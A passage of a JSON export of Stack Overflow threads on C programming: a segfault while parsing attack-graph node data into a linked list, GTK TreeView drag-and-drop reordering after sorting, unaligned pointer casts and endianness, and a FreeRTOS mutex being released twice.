data-&gt;node_name);\n}\n</code></pre>\n\n<p>and this is the output:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>ID: 1, node_name: execCode(workStation,root)\nID: 2, node_name: RULE 4 (Trojan horse installation)\nID: 3, node_name: accessFile(workStation,write,'/usr/local/share')\nID: 4, node_name: RULE 16 (NFS semantics)\nID: 5, node_name: accessFile(fileServer,write,'/export')\nID: 6, node_name: RULE 10 (execCode implies file access)\nID: 7, node_name: canAccessFile(fileServer,root,write,'/export')\n</code></pre>\n\n<p>Now if you use this code and you keep getting valgrind errors, then that means\nthat you still have errors in other parts of your code that you haven't shown\nus.</p>\n"}], "owner": {"reputation": 19, "user_id": 8955046, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/06a038d28aa9c35ac8c0c02990f8de28?s=128&d=identicon&r=PG", "display_name": "user8955046", "link": "https://stackoverflow.com/users/8955046/user8955046"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 112, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1518572784, "creation_date": 1518555138, "last_edit_date": 1518565626, "question_id": 48775429, "link": "https://stackoverflow.com/questions/48775429/why-am-i-getting-segmentation-fault-on-the-code-below", "title": "why am I getting segmentation fault on the code below?", "body": "<p>I have a txt file where I just want to get lines bigger than 12 characters. Than these lines are inserted in a variable called graph of type graph_node.</p>\n\n<p>txt file:</p>\n\n<pre><code>1,\"execCode(workStation,root)\",\"OR\",0\n2,\"RULE 4 (Trojan horse installation)\",\"AND\",0\n3,\"accessFile(workStation,write,'/usr/local/share')\",\"OR\",0\n4,\"RULE 16 (NFS semantics)\",\"AND\",0\n5,\"accessFile(fileServer,write,'/export')\",\"OR\",0\n6,\"RULE 10 (execCode implies file access)\",\"AND\",0\n7,\"canAccessFile(fileServer,root,write,'/export')\",\"LEAF\",1\n6,7,-1\n</code></pre>\n\n<p>graph node type:</p>\n\n<pre><code>#ifndef Graph_Structure\n#define Graph_Structure\n\nstruct Graph_Node{\n\n    char id[50];\n    char node_name[50];\n\n    struct Graph_Node* next;\n    struct Graph_Node* edges;\n\n    };  \n\ntypedef struct Graph_Node graph_node;\n\n\n#endif   \n</code></pre>\n\n<p>this is the method to insert data into graph variable:</p>\n\n<pre><code>void insert_node(graph_node** node, graph_node* data){\n\n    printf(\"\\nINSERTING\\n\");\n\n    graph_node* temp = (graph_node*)malloc(sizeof(graph_node));\n\n    for(int i = 0; i &lt; strlen(data-&gt;id); i++)\n        temp-&gt;id[i] = data-&gt;id[i];\n\n    for(int i = 0; i &lt; strlen(data-&gt;node_name) - 1; i++)\n        temp-&gt;node_name[i] = data-&gt;node_name[i];\n\n    temp -&gt; next = *node;\n    *node = temp;\n\n    }\n</code></pre>\n\n<p>this is the method to get the lines in the txt file bigger than 12 characters:</p>\n\n<pre><code>void generate_nodes(graph_node** graph, char* file_name){\n\n    graph_node* data = (graph_node*)malloc(sizeof(graph_node));\n\n    FILE* f_Data_Pointer = fopen(file_name, \"r\");\n    FILE* f_Aux_Pointer = fopen(file_name, \"r\");\n\n    char c = 0; char line[256];\n\n        int counter = 0; \n        int q = 0; //quotation marks\n\n        bool jump_line = false;\n\n    while(!feof(f_Data_Pointer)){\n\n        c = 0; memset(line, 0, sizeof(line));\n\n        while(c != '\\n' &amp;&amp; !feof(f_Aux_Pointer)){ // check line\n\n            c = fgetc(f_Aux_Pointer); \n            line[counter] = c;\n            counter++;\n\n        }\n\n        if(strlen(line) &gt; 12){ //lines with no edges  \n\n         /*line[counter-3] != '-' &amp;&amp; line[counter-2] != '1'*/\n\n         int size = strlen(line); printf(\"\\nline size: %d\\n\", size);\n\n            counter = 0; c = 0;\n\n            while(c != ','){ //id\n\n                c = fgetc(f_Data_Pointer);\n\n                if(c != ','){\n\n                    data-&gt;id[counter] = c;          \n                    counter++;\n                }\n\n                printf(\"%c\", c);\n\n            }\n\n\n            counter = 0; c = 0;\n\n            while(1){ //node_name\n\n                c = fgetc(f_Data_Pointer);\n\n                if(c != '\"'){\n\n                data-&gt;node_name[counter] = c;\n                counter++;\n\n                } \n\n                else{\n\n                    q++;                \n                }\n\n                if(q &gt; 1 &amp;&amp; c == ',')\n                    break;\n\n                printf(\"%c\", c);\n\n            }\n\n            counter = 0; c = 0; \n\n            while(c != '\\n'){ \n\n                c = fgetc(f_Data_Pointer);\n                printf(\"%c\", c);\n\n            }\n\n            insert_node(graph, data);\n            memset(data-&gt;id, 0, sizeof(data-&gt;id));\n            memset(data-&gt;node_name, 0, sizeof(data-&gt;node_name));\n\n        }\n\n        else{ //lines with edges\n\n            while(c != '\\n' &amp;&amp; !feof(f_Data_Pointer)){ \n\n                c = fgetc(f_Data_Pointer);\n\n            }\n\n        }\n\n    }\n\n    fclose(f_Data_Pointer);\n    fclose(f_Aux_Pointer);\n\n}\n</code></pre>\n\n<p>I am getting the errors inside the insert method on the commands \"for\" in \"strlen\" it says that data->id and data->node_name are not initialized but I don't understand why. I used malloc on data: </p>\n\n<pre><code>graph_node* data = (graph_node*)malloc(sizeof(graph_node));\n</code></pre>\n\n<p>error:</p>\n\n<pre><code>Conditional jump or move depends on uninitialised value(s) ==3612== at 0x4C30B18: strcpy (vg_replace_strmem.c:510) ==3612== by 0x4008B2: insert_node (mulval.c:44) ==3612== by 0x400C03: generate_nodes (mulval.c:159) ==3612== by 0x400CE8: main (mulval.c:187)\n</code></pre>\n"}, {"tags": ["c", "gtk", "glade", "gtk2", "gtktreeview"], "answers": [{"comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user4918296"}, "edited": false, "score": 0, "creation_date": 1518626407, "post_id": 48777259, "comment_id": 84586359, "body": "This restores the previous order but I still cannot reorder it manually by drag and drop."}, {"owner": {"reputation": 3049, "user_id": 6150775, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/f16a0c1701c5debb928d96fa22ba0582?s=128&d=identicon&r=PG&f=1", "display_name": "theGtknerd", "link": "https://stackoverflow.com/users/6150775/thegtknerd"}, "edited": false, "score": 0, "creation_date": 1518629392, "post_id": 48777259, "comment_id": 84588182, "body": "Can you reorder at all with drag and drop? Sorry, for some reason your program doesn&#39;t run for me and I am not good at C."}, {"owner": {"reputation": 3049, "user_id": 6150775, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/f16a0c1701c5debb928d96fa22ba0582?s=128&d=identicon&r=PG&f=1", "display_name": "theGtknerd", "link": "https://stackoverflow.com/users/6150775/thegtknerd"}, "edited": false, "score": 0, "creation_date": 1518631028, "post_id": 48777259, "comment_id": 84588989, "body": "Ok, I got it going. But your program is Gtk2 and I only know Gtk3."}, {"owner": {"user_type": "does_not_exist", "display_name": "user4918296"}, "edited": false, "score": 0, "creation_date": 1518633273, "post_id": 48777259, "comment_id": 84590124, "body": "I can reorder with my version until I click the column and sort the treeview. If I wrap the treemodel in a treesort then I cannot reorder at all."}, {"owner": {"reputation": 3049, "user_id": 6150775, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/f16a0c1701c5debb928d96fa22ba0582?s=128&d=identicon&r=PG&f=1", "display_name": "theGtknerd", "link": "https://stackoverflow.com/users/6150775/thegtknerd"}, "edited": false, "score": 0, "creation_date": 1518634621, "post_id": 48777259, "comment_id": 84590845, "body": "Of <a href=\"https://stackoverflow.com/questions/13882076/how-to-have-drag-and-drop-and-sorted-gtktreeview-in-gtk3\">interest</a>."}], "tags": [], "owner": {"reputation": 3049, "user_id": 6150775, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/f16a0c1701c5debb928d96fa22ba0582?s=128&d=identicon&r=PG&f=1", "display_name": "theGtknerd", "link": "https://stackoverflow.com/users/6150775/thegtknerd"}, "is_accepted": false, "score": 1, "last_activity_date": 1518563895, "creation_date": 1518563895, "answer_id": 48777259, "question_id": 48775238, "link": "https://stackoverflow.com/questions/48775238/reorder-rows-in-gtktreeview-after-they-have-been-sorted/48777259#48777259", "title": "Reorder rows in GtkTreeView after they have been sorted", "body": "<p>You need to wrap the treemodel with a treesort, then every third click disables the sorting. </p>\n\n<p>Glade file:</p>\n\n<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;!-- Generated with glade 3.18.3 --&gt;\n&lt;interface&gt;\n  &lt;requires lib=\"gtk+\" version=\"3.0\"/&gt;\n  &lt;object class=\"GtkTreeStore\" id=\"treestore\"&gt;\n    &lt;columns&gt;\n      &lt;!-- column-name col --&gt;\n      &lt;column type=\"gchararray\"/&gt;\n    &lt;/columns&gt;\n  &lt;/object&gt;\n  &lt;object class=\"GtkTreeModelSort\" id=\"treesort\"&gt;\n    &lt;property name=\"model\"&gt;treestore&lt;/property&gt;\n  &lt;/object&gt;\n  &lt;object class=\"GtkWindow\" id=\"main\"&gt;\n    &lt;property name=\"can_focus\"&gt;False&lt;/property&gt;\n    &lt;property name=\"default_width\"&gt;690&lt;/property&gt;\n    &lt;property name=\"default_height\"&gt;500&lt;/property&gt;\n    &lt;signal name=\"destroy\" handler=\"gtk_main_quit\" swapped=\"no\"/&gt;\n    &lt;child&gt;\n      &lt;object class=\"GtkTreeView\" id=\"treeview\"&gt;\n        &lt;property name=\"visible\"&gt;True&lt;/property&gt;\n        &lt;property name=\"can_focus\"&gt;True&lt;/property&gt;\n        &lt;property name=\"model\"&gt;treesort&lt;/property&gt;\n        &lt;property name=\"reorderable\"&gt;True&lt;/property&gt;\n        &lt;property name=\"level_indentation\"&gt;1&lt;/property&gt;\n        &lt;property name=\"enable_tree_lines\"&gt;True&lt;/property&gt;\n        &lt;child internal-child=\"selection\"&gt;\n          &lt;object class=\"GtkTreeSelection\" id=\"treeview-selection1\"/&gt;\n        &lt;/child&gt;\n        &lt;child&gt;\n          &lt;object class=\"GtkTreeViewColumn\" id=\"treeviewcolumn\"&gt;\n            &lt;property name=\"sizing\"&gt;fixed&lt;/property&gt;\n            &lt;property name=\"title\" translatable=\"yes\"&gt;column&lt;/property&gt;\n            &lt;property name=\"clickable\"&gt;True&lt;/property&gt;\n            &lt;property name=\"sort_indicator\"&gt;True&lt;/property&gt;\n            &lt;property name=\"sort_column_id\"&gt;0&lt;/property&gt;\n            &lt;child&gt;\n              &lt;object class=\"GtkCellRendererText\" id=\"treeviewrenderer\"&gt;\n                &lt;property name=\"height\"&gt;30&lt;/property&gt;\n              &lt;/object&gt;\n              &lt;attributes&gt;\n                &lt;attribute name=\"text\"&gt;0&lt;/attribute&gt;\n              &lt;/attributes&gt;\n            &lt;/child&gt;\n          &lt;/object&gt;\n        &lt;/child&gt;\n      &lt;/object&gt;\n    &lt;/child&gt;\n  &lt;/object&gt;\n&lt;/interface&gt;\n</code></pre>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user4918296"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 226, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1518563895, "creation_date": 1518554306, "question_id": 48775238, "link": "https://stackoverflow.com/questions/48775238/reorder-rows-in-gtktreeview-after-they-have-been-sorted", "title": "Reorder rows in GtkTreeView after they have been sorted", "body": "<p>I have the following GTK+ program which uses an Glade generated XML file to construct its GUI.</p>\n\n<pre><code>#include &lt;gtk/gtk.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\n////////////////////////////////////////////////////\n// Example can be compiled with:\n// gcc gui.c `pkg-config --cflags --libs gtk+-2.0`\n//\n// GUI file from glade must be in same folder from\n// which the compiled binary is called.\n////////////////////////////////////////////////////\nint main(int argc, char* argv[]) {\n    GtkBuilder* gtkBuilder = gtk_builder_new();\n\n    gtk_init(&amp;argc, &amp;argv);\n\n    gtk_builder_add_from_file(gtkBuilder, \"gui.glade\", NULL);\n\n    GtkTreeStore* treestore = GTK_TREE_STORE(gtk_builder_get_object(gtkBuilder, \"treestore\"));\n\n    GtkTreeIter iterChild;\n\n    gtk_tree_store_append(treestore, &amp;iterChild, NULL);\n    gtk_tree_store_set(treestore, &amp;iterChild, 0, \"a\", -1);\n    gtk_tree_store_append(treestore, &amp;iterChild, NULL);\n    gtk_tree_store_set(treestore, &amp;iterChild, 0, \"b\", -1);\n    gtk_tree_store_append(treestore, &amp;iterChild, NULL);\n    gtk_tree_store_set(treestore, &amp;iterChild, 0, \"m\", -1);\n    gtk_tree_store_append(treestore, &amp;iterChild, NULL);\n    gtk_tree_store_set(treestore, &amp;iterChild, 0, \"k\", -1);\n    gtk_tree_store_append(treestore, &amp;iterChild, NULL);\n    gtk_tree_store_set(treestore, &amp;iterChild, 0, \"g\", -1);\n\n    gtk_builder_connect_signals(gtkBuilder, NULL);\n\n    gtk_widget_show(GTK_WIDGET(gtk_builder_get_object(gtkBuilder, \"main\")));\n\n    g_object_unref(G_OBJECT(gtkBuilder));\n\n    gtk_main();\n\n    return 0;\n}\n</code></pre>\n\n<p>The XML Glade file looks like this:</p>\n\n<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;interface&gt;\n  &lt;requires lib=\"gtk+\" version=\"2.24\"/&gt;\n  &lt;!-- interface-naming-policy project-wide --&gt;\n  &lt;object class=\"GtkTreeStore\" id=\"treestore\"&gt;\n    &lt;columns&gt;\n      &lt;!-- column-name col --&gt;\n      &lt;column type=\"gchararray\"/&gt;\n    &lt;/columns&gt;\n  &lt;/object&gt;\n  &lt;object class=\"GtkWindow\" id=\"main\"&gt;\n    &lt;property name=\"can_focus\"&gt;False&lt;/property&gt;\n    &lt;property name=\"default_width\"&gt;690&lt;/property&gt;\n    &lt;property name=\"default_height\"&gt;500&lt;/property&gt;\n    &lt;signal name=\"destroy\" handler=\"gtk_main_quit\" swapped=\"no\"/&gt;\n    &lt;child&gt;\n      &lt;object class=\"GtkTreeView\" id=\"treeview\"&gt;\n        &lt;property name=\"visible\"&gt;True&lt;/property&gt;\n        &lt;property name=\"can_focus\"&gt;True&lt;/property&gt;\n        &lt;property name=\"model\"&gt;treestore&lt;/property&gt;\n        &lt;property name=\"reorderable\"&gt;True&lt;/property&gt;\n        &lt;property name=\"level_indentation\"&gt;1&lt;/property&gt;\n        &lt;property name=\"enable_tree_lines\"&gt;True&lt;/property&gt;\n        &lt;child&gt;\n          &lt;object class=\"GtkTreeViewColumn\" id=\"treeviewcolumn\"&gt;\n            &lt;property name=\"sizing\"&gt;fixed&lt;/property&gt;\n            &lt;property name=\"title\" translatable=\"yes\"&gt;column&lt;/property&gt;\n            &lt;property name=\"clickable\"&gt;True&lt;/property&gt;\n            &lt;property name=\"sort_indicator\"&gt;True&lt;/property&gt;\n            &lt;property name=\"sort_column_id\"&gt;0&lt;/property&gt;\n            &lt;child&gt;\n              &lt;object class=\"GtkCellRendererText\" id=\"treeviewrenderer\"&gt;\n                &lt;property name=\"height\"&gt;30&lt;/property&gt;\n              &lt;/object&gt;\n              &lt;attributes&gt;\n                &lt;attribute name=\"text\"&gt;0&lt;/attribute&gt;\n              &lt;/attributes&gt;\n            &lt;/child&gt;\n          &lt;/object&gt;\n        &lt;/child&gt;\n      &lt;/object&gt;\n    &lt;/child&gt;\n  &lt;/object&gt;\n&lt;/interface&gt;\n</code></pre>\n\n<p>When the application starts the rows can be reordered by Drag 'n' Drop. After the column header is clicked the rows will be sorted. Afterwards they can not be rearranged by Drag 'n' Drop anymore.</p>\n\n<p>Is there any way to reactivate manual reordering after the rows have been sorted?</p>\n\n<p>I have tried, e.g., calling <code>gtk_tree_view_set_reorderable()</code> from within a callback function (callback was <code>on_cursor_moved()</code>) but this did not work.</p>\n\n<p>Is it possible at all to switch between sorted and reorderable rows when using a Glade XML file to construct the GUI?</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 70931, "user_id": 882003, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/de71acd9a8eab73186dea35aea7a68f2?s=128&d=identicon&r=PG", "display_name": "john", "link": "https://stackoverflow.com/users/882003/john"}, "edited": false, "score": 1, "creation_date": 1518554421, "post_id": 48775216, "comment_id": 84552185, "body": "2561 = 256*10 + 1, thats enough I think"}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1518554424, "post_id": 48775216, "comment_id": 84552187, "body": "Print the contents of the array as <i>bytes</i> to see it. That should explain what you&#39;re seeing."}, {"owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 5, "creation_date": 1518554622, "post_id": 48775216, "comment_id": 84552281, "body": "Note that the outcome of this code will be different depending on the endianness of the processor. And on some processors, the code will just crash because of alignment restrictions. In short, don&#39;t do that."}, {"owner": {"reputation": 94553, "user_id": 775806, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/XNd2C.png?s=128&g=1", "display_name": "n. &#39;pronouns&#39; m.", "link": "https://stackoverflow.com/users/775806/n-pronouns-m"}, "edited": false, "score": 2, "creation_date": 1518555040, "post_id": 48775216, "comment_id": 84552486, "body": "Undefined behaviour happens."}, {"owner": {"reputation": 3975, "user_id": 8513665, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c39368317b0749f5d8f09735796c470e?s=128&d=identicon&r=PG&f=1", "display_name": "Christian Gibbons", "link": "https://stackoverflow.com/users/8513665/christian-gibbons"}, "edited": false, "score": 3, "creation_date": 1518555187, "post_id": 48775216, "comment_id": 84552558, "body": "You violate strict aliasing (which is true regardless of alignment)"}], "answers": [{"comments": [{"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 3, "creation_date": 1518554917, "post_id": 48775336, "comment_id": 84552425, "body": "And many RISC machines don&#39;t like misaligned access.  DEC Alpha converted a misaligned access into a system trap that either aborted the program or processed the read in several parts and mangled the data to assemble the answer.  That was not fast \u2014 a misaligned memory access was something to avoid at all costs."}, {"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "reply_to_user": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1518554951, "post_id": 48775336, "comment_id": 84552437, "body": "yes, some machines tolerate unalignment, but it&#39;s more costly, specially if it&#39;s emulated by software! (sorry for the 680x0 love BTW :))"}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1518555277, "post_id": 48775336, "comment_id": 84552608, "body": "I still have a soft spot for the 680x0 chip set.  PPC is an heir and successor via the RS6000 chips, I believe.  The DEC Alpha natively objected to the misaligned access; it was a software &#39;fix&#39; that allowed it to continue.  Personally, I think that the crash was appropriate."}, {"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "reply_to_user": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 1, "creation_date": 1518555359, "post_id": 48775336, "comment_id": 84552650, "body": "They &quot;fixed&quot; the misaligned access on 68020 (68000/68010 crash on odd access), but that means that codes for 68020 using only 68000 instruction may only run on ... 68020... how sick is that :)"}], "tags": [], "owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "is_accepted": true, "score": 6, "last_activity_date": 1518725136, "last_edit_date": 1518725136, "creation_date": 1518554701, "answer_id": 48775336, "question_id": 48775216, "link": "https://stackoverflow.com/questions/48775216/what-happens-when-you-cast-a-char-address-to-int-in-c-when-the-address-is-no/48775336#48775336", "title": "What happens when you cast a char * address to int * in C when the address is not word-aligned?", "body": "<pre><code>c = a + 1;\n</code></pre>\n\n<p>now <code>c</code> points on <code>1</code> (second element of <code>a</code>)</p>\n\n<pre><code>c = (int *)((char*) c + 1);\n</code></pre>\n\n<p>You \"cheated\" with pointer arithmetic, adding 1 to the address, regardless of the size of the <code>int</code> (note that it is illegal on old machines like 68000 which don't tolerate multi-byte access to odd addresses, or will do the job, albeit a lot slower, which is kind of worse since you're not noticing it for instance it works on a 68020 but slower).</p>\n\n<p>now <code>c</code> points on the 3 last bytes of <code>a[1]</code> and overflows on the first byte of <code>a[2]</code>, so when you do:</p>\n\n<pre><code>*c = 10;\n</code></pre>\n\n<p>since your machine is little endian, you're leaving the leading <code>1</code> value, write <code>10</code> in the next location, and zeroes afterwards, clobbering the leading <code>2</code> byte of <code>a[2]</code></p>\n\n<p>So now:</p>\n\n<pre><code> a[1] = 1 + (10&lt;&lt;8) = 2561\n a[2] = 0\n</code></pre>\n\n<p>the result is different on a big endian machine:</p>\n\n<p>PowerPC big endian (if <code>int</code> is 32 bit, else it's a different result):</p>\n\n<pre><code>a[1] = 10485760\na[2] = 2   // first byte is overwritten, but with zero\n</code></pre>\n\n<p>68000/68010:</p>\n\n<pre><code>bus error (coredump) / guru meditation\n</code></pre>\n\n<p>to sum it up: <a href=\"https://stackoverflow.com/questions/98650/what-is-the-strict-aliasing-rule\">Don't violate the strict aliasing rule</a></p>\n"}], "owner": {"reputation": 23, "user_id": 9356823, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c9f61cb1595c84d3a49207f66279c62b?s=128&d=identicon&r=PG&f=1", "display_name": "yetanothercprogrammer", "link": "https://stackoverflow.com/users/9356823/yetanothercprogrammer"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 112, "favorite_count": 0, "accepted_answer_id": 48775336, "answer_count": 1, "score": 2, "last_activity_date": 1518725136, "creation_date": 1518554224, "last_edit_date": 1518554446, "question_id": 48775216, "link": "https://stackoverflow.com/questions/48775216/what-happens-when-you-cast-a-char-address-to-int-in-c-when-the-address-is-no", "title": "What happens when you cast a char * address to int * in C when the address is not word-aligned?", "body": "<p>I'm running this bit of code to understand pointers a little better.</p>\n\n<pre><code>void foo(void)\n{\n    int a[4] = {0, 1, 2, 3};\n\n    printf(\"a[0]:%d, a[1]:%d, a[2]:%d, a[3]:%d\\n\", a[0], a[1], a[2], a[3]);\n\n    int *c;\n\n    c = a + 1;\n    c = (int *)((char*) c + 1);\n    *c = 10;\n\n    printf(\"c:%p, c+1:%p\\n\", c, c+1);\n    printf(\"a:%p, a1:%p, a2:%p, a3:%p\\n\", a, a+1, a+2, a+3);\n\n    printf(\"a[0]:%d, a[1]:%d, a[2]:%d, a[3]:%d\\n\", a[0], a[1], a[2], a[3]);\n\n    printf(\"c[0]:%d, c[1]:%d\\n\", *c, *(c+1));\n\n}\n</code></pre>\n\n<p>The output I get is:</p>\n\n<pre><code>a[0]:0, a[1]:1, a[2]:2, a[3]:3\nc:0xbfca1515, c+1:0xbfca1519\na:0xbfca1510, a1:0xbfca1514, a2:0xbfca1518, a3:0xbfca151c\na[0]:0, a[1]:2561, a[2]:0, a[3]:3\nc[0]:10, c[1]:50331648\n</code></pre>\n\n<p>Could someone please explain how a[1] is now 2561?</p>\n\n<p>I understand that when we do this:</p>\n\n<pre><code>c = (int *) ((char *) c + 1);\n</code></pre>\n\n<p>c is now pointing to the 4 bytes following the first byte of a[1].</p>\n\n<p>But how did a[1] end up with 2561?</p>\n\n<p>I'm guessing this has to do with endianness?</p>\n"}, {"tags": ["c", "embedded", "mutex", "freertos", "cmsis"], "comments": [{"owner": {"reputation": 5703, "user_id": 1401213, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ccb697eb985c37893ed06f3c3324c7c8?s=128&d=identicon&r=PG&f=1", "display_name": "kkrambo", "link": "https://stackoverflow.com/users/1401213/kkrambo"}, "edited": false, "score": 1, "creation_date": 1518557471, "post_id": 48775185, "comment_id": 84553646, "body": "I believe osMutexWait() and osMutexRelease() are not FreeRTOS functions.  Are you using CMSIS RTOS?"}, {"owner": {"reputation": 5703, "user_id": 1401213, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ccb697eb985c37893ed06f3c3324c7c8?s=128&d=identicon&r=PG&f=1", "display_name": "kkrambo", "link": "https://stackoverflow.com/users/1401213/kkrambo"}, "edited": false, "score": 1, "creation_date": 1518557542, "post_id": 48775185, "comment_id": 84553685, "body": "Why would Thread 2 even try to release the mutex without first obtaining it?"}, {"owner": {"reputation": 13, "user_id": 9356941, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eeb3b606a963608ff7377376d4463424?s=128&d=identicon&r=PG&f=1", "display_name": "David K.", "link": "https://stackoverflow.com/users/9356941/david-k"}, "reply_to_user": {"reputation": 5703, "user_id": 1401213, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ccb697eb985c37893ed06f3c3324c7c8?s=128&d=identicon&r=PG&f=1", "display_name": "kkrambo", "link": "https://stackoverflow.com/users/1401213/kkrambo"}, "edited": false, "score": 0, "creation_date": 1518557636, "post_id": 48775185, "comment_id": 84553724, "body": "I am using CMSIS with FreeRTOS. That&#39;s a good question, and part of what we&#39;re trying to debug. The release of the mutex depends on a message arriving in a queue. We&#39;ve verified that the message only makes it to the queue once, but it somehow triggers the release function twice."}, {"owner": {"reputation": 5703, "user_id": 1401213, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ccb697eb985c37893ed06f3c3324c7c8?s=128&d=identicon&r=PG&f=1", "display_name": "kkrambo", "link": "https://stackoverflow.com/users/1401213/kkrambo"}, "edited": false, "score": 1, "creation_date": 1518558062, "post_id": 48775185, "comment_id": 84553931, "body": "CMSIS has an RTOS component that includes osMutexWait() and osMutexRelease().  I can understand that you would use the non-RTOS components of CMSIS with FreeRTOS.  But I don&#39;t understand why you would use CMSIS RTOS with FreeRTOS.  If you&#39;re using FreeRTOS then perhaps you want xSemaphoreTake() and xSemaphoreGive() instead."}, {"owner": {"reputation": 13, "user_id": 9356941, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eeb3b606a963608ff7377376d4463424?s=128&d=identicon&r=PG&f=1", "display_name": "David K.", "link": "https://stackoverflow.com/users/9356941/david-k"}, "reply_to_user": {"reputation": 5703, "user_id": 1401213, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ccb697eb985c37893ed06f3c3324c7c8?s=128&d=identicon&r=PG&f=1", "display_name": "kkrambo", "link": "https://stackoverflow.com/users/1401213/kkrambo"}, "edited": false, "score": 0, "creation_date": 1518558478, "post_id": 48775185, "comment_id": 84554183, "body": "Maybe I&#39;m not understanding the use case for CMSIS correctly. I thought it was just a wrapper around the RTOS of your choice, allowing you to switch out RTOSes if necessary. I&#39;ll try using the direct FreeRTOS calls and let you know if anything changes."}, {"owner": {"reputation": 5703, "user_id": 1401213, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ccb697eb985c37893ed06f3c3324c7c8?s=128&d=identicon&r=PG&f=1", "display_name": "kkrambo", "link": "https://stackoverflow.com/users/1401213/kkrambo"}, "edited": false, "score": 0, "creation_date": 1518559263, "post_id": 48775185, "comment_id": 84554567, "body": "You may be right that your CMSIS RTOS implementation is a wrapper for FreeRTOS.  I probably misunderstood.  I agree with your understanding of the mutex -- only the owner thread should be able to release it."}, {"owner": {"reputation": 76010, "user_id": 168986, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/MqorX.jpg?s=128&g=1", "display_name": "Clifford", "link": "https://stackoverflow.com/users/168986/clifford"}, "edited": false, "score": 0, "creation_date": 1518563294, "post_id": 48775185, "comment_id": 84555965, "body": "It would probably be better to avoid the issue altogether by having a third thread that services the UART and have the two existing threads send data to that rather then having direct and contended access to the UART. Then no mutex is required at all and the behaviour will be more deterministic and easier to debug."}, {"owner": {"reputation": 2316, "user_id": 469006, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d3855250cd4b053ce9204c773246196b?s=128&d=identicon&r=PG", "display_name": "D Krueger", "link": "https://stackoverflow.com/users/469006/d-krueger"}, "edited": false, "score": 2, "creation_date": 1518564412, "post_id": 48775185, "comment_id": 84556301, "body": "Is the releasing thread is of a lower priority than the acquiring thread? It could be that everything is functioning correctly, but preemption prevents the lower priority thread from printing before the higher priority thread prints."}, {"owner": {"reputation": 2030, "user_id": 550235, "user_type": "registered", "accept_rate": 50, "profile_image": 